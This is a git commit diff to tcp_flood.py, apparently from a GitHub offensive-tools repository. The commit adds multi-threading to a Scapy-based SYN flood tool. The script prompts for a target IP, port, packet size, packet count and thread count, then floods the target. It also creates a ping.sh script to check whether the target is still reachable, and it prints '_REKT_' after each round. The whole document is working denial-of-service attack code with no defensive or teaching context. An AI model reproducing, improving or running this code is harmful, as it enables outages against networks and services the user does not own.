cf55cfe57743c8a2540cb8b2c6afbab0717da14e
ᥴ̶̧̪̤̓͊̌̽̊̎̓͜͝͠ꪮ̵͈̀͐͗͒̽͛͊͝ꪀ̸̧̨̺̮̩̣̤͂̾͜ᦓ̵̠̂̅̈́̊ͅꪮ̶̢͇̟͆͗͆́̌͗͂͒̀͜͝ꪶ̴̨̧̖͍̞̲̖̠̆̽̈́̇̾̍̒̕͠ͅꫀ̵̡̨̧̛͚͕̝̭̦̩̻̈́̚̚ͅ <162306504+cons0le7@users.noreply.github.com>
2024-09-13 00:50:39 +0000

    Add files via upload
    TCP flood now includes multi-threading

--- tcp_flood.py
+++ tcp_flood.py
@@ -1,7 +1,8 @@
 import os 
+import threading
 from scapy.all import * 
 
-def send_syn(TCP_IP, TCP_PORT):
+def send_syn(TCP_IP, TCP_PORT, packet_size):
     payload_size = (packet_size)
     payload = b'X' * payload_size 
     ip = IP(dst=TCP_IP)
@@ -21,7 +22,7 @@ done
     with open(bash_script_name, 'w') as bash_file:
         bash_file.write(bash_script_content)
     os.chmod(bash_script_name, 0o755)
-    print(color_red(f"Bash script '{bash_script_name}' created to ping {ip_address} every 3 seconds."))
+    print(color_red(f"Bash script '{bash_script_name}' created to ping {ip_address}."))
 
 def execute_bash_script():
     os.system('./ping.sh')
@@ -44,6 +45,17 @@ def color_yellow(text):
 def create_message(size):
     return b'X' * size 
 
+
+def start_threads(TCP_IP, TCP_PORT, packet_size, thread_count):
+    threads = []
+    for T in range(thread_count):
+        thread = threading.Thread(target=send_syn, args=(TCP_IP, TCP_PORT, packet_size))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+
+
 print(color_red("""                                
   _______ _____ _____    ______ _      ____   ____  _____  
  |__   __/ ____|  __ \  |  ____| |    / __ \ / __ \|  __ \ 
@@ -57,15 +69,16 @@ print(color_red("""
 TCP_IP = input(color_red("Enter the target IP address: "))
 TCP_PORT = int(input(color_red("Enter the target port number: ")))
 packet_size = int(input(color_red("Enter packet size in bytes (1-1460):")))
-print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
 amount = int(input(color_red("Number of packets to send:")))
+print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
+thread_count = int(input(color_red("Enter the number of threads: ")))
 
 user_ip = TCP_IP
     
 makebash(user_ip)
     
 for i in range(amount):
-    send_syn(TCP_IP, TCP_PORT)
+    start_threads(TCP_IP, TCP_PORT, packet_size, thread_count)
     print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))
 
 print("~DONE~") 
